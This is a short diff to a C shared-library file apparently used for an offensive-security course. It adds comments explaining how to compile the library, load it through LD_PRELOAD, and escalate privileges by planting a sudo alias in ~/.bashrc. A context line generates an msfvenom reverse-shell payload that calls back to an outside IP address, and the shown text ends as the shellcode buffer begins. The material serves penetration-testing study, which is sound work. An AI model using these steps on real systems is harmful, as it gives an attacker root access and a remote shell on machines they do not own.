@@ -5,9 +5,22 @@
 #include <dlfcn.h>
 #include <unistd.h>
 
-// To compile:
+// Compile:
+// -----------
 // gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_PRELOAD.c
 // gcc -shared -o sharedLibrary_LD_PRELOAD.so sharedLibrary_LD_PRELOAD.o -ldl
+// 
+// Execute (user context):
+// --------
+// export LD_PRELOAD=/home/offsec/evil_geteuid.so
+// cp /etc/passwd /tmp/passwd
+//
+// Privilege escalation (Has sudo privileges):
+// ---------------------
+// unset LD_PRELOAD
+// echo 'alias sudo="sudo LD_PRELOAD=/home/offsec/sharedLibrary_LD_PRELOAD.so"' >> ~/.bashrc
+// source ~/.bashrc
+// sudo cp /etc/passwd /tmp/testpasswd
 
 // msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.153 LPORT=443 -f c
 unsigned char buf[] = 
